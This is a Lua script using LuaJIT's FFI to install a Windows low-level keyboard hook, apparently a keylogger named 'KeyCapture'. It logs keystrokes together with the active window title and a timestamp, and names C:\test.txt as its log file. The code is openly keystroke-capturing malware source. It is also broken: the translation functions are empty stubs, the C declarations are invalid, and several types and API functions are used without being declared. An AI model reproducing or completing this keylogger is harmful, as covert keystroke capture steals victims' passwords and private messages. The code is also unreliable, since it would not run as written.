-- Load the FFI library
local ffi = require("ffi")

-- Define some constants
ffi.cdef[[
    static const int WH_KEYBOARD_LL = 13;
    static const int VK_LSHIFT = 0xA0;
    static const int VK_RSHIFT = 0xA1;
    static const int VK_CAPITAL = 0x14;
    static const int WM_KEYDOWN = 0x0100;
    static const int WM_KEYUP = 0x0101;
]]

-- Windows API function definitions
ffi.cdef[[
    typedef struct tagKBDLLHOOKSTRUCT {
        unsigned long vkCode;
        unsigned long scanCode;
        unsigned long flags;
        unsigned long time;
        unsigned long dwExtraInfo;
    } KBDLLHOOKSTRUCT;

    typedef int BOOL;
    typedef void* HHOOK;
    typedef void* HWND;
    typedef unsigned short WORD;

    BOOL UnhookWindowsHookEx(HHOOK hhk);
    HHOOK SetWindowsHookExA(int idHook, ffi.fn("LRESULT (__cdecl *)(int, WPARAM, LPARAM)", HookProcedure), void* hMod, int dwThreadId);
    int GetKeyState(int nVirtKey);
    HWND GetForegroundWindow();
    int GetWindowTextA(HWND hWnd, char* lpString, int nMaxCount);
    void GetLocalTime(void* lpSystemTime);
]]

-- Global variables
local shift = false
local lastWindow = nil
local fileName = "C:\\test.txt"
local keyboardHook = nil
local outPut = ""  -- Initialize the output variable

-- Function to translate VK code to key string
local function HookCode(code, caps, shift)
    local key = ""
    -- Translate the VK code to key string
    -- Add your key translations here
    -- Example: if code == ffi.C.VK_A then key = caps and (shift and "A" or "a") or (shift and "a" or "A") end
    return key
end

-- Function to get the day of the week in text
local function DayOfWeek(code)
    local name = ""
    -- Translate the day of the week code to text
    -- Add your translations here
    return name
end

-- Keyboard hook procedure
local function HookProcedure(nCode, wParam, lParam)
    local caps = false
    local capsShort = ffi.C.GetKeyState(ffi.C.VK_CAPITAL)

    if capsShort > 0 then
        caps = true
    end

    if nCode == 0 then
        local p = ffi.cast("KBDLLHOOKSTRUCT*", lParam)

        if p.vkCode == ffi.C.VK_LSHIFT or p.vkCode == ffi.C.VK_RSHIFT then
            if wParam == ffi.C.WM_KEYDOWN then
                shift = true
            elseif wParam == ffi.C.WM_KEYUP then
                shift = false
            else
                shift = false
            end
        end

        if wParam == ffi.C.WM_SYSKEYDOWN or wParam == ffi.C.WM_KEYDOWN then
            local currentWindow = ffi.C.GetForegroundWindow()

            if currentWindow ~= lastWindow then
                local t = ffi.new("SYSTEMTIME")
                ffi.C.GetLocalTime(t)
                local day = t.wDay
                local month = t.wMonth
                local year = t.wYear
                local hour = t.wHour
                local min = t.wMinute
                local sec = t.wSecond
                local dayName = t.wDayOfWeek

                local temp = "\n\n[+] " .. DayOfWeek(dayName) .. " - " .. day .. "/" .. month .. "/" .. year .. "  "
                temp = temp .. hour .. ":" .. min .. ":" .. sec
                outPut = outPut .. temp
                local cWindow = ffi.new("char[?]", 1000)
                local c = ffi.C.GetWindowTextA(currentWindow, cWindow, 1000)
                local windowText = ffi.string(cWindow, c)
                temp = " - Current Window: " .. windowText .. "\n\n"
                outPut = outPut .. temp
                lastWindow = currentWindow
            end

            local temp = HookCode(p.vkCode, caps, shift)
            outPut = outPut .. temp
        end
    end

    return ffi.C.CallNextHookEx(nil, nCode, wParam, lParam)
end

-- Main function
local function main()
    print("[*] Starting KeyCapture")
    keyboardHook = ffi.C.SetWindowsHookExA(ffi.C.WH_KEYBOARD_LL, HookProcedure, nil, 0)

    if keyboardHook == nil then
        print("[!] Failed to get handle from SetWindowsHookEx()")
    else
        print("[*] KeyCapture handle ready")

        local msg = ffi.new("MSG")
        while ffi.C.GetMessage(msg, nil, 0, 0) > 0 do
            ffi.C.TranslateMessage(msg)
            ffi.C.DispatchMessage(msg)
        end
    end

    ffi.C.UnhookWindowsHookEx(keyboardHook)
end

main()

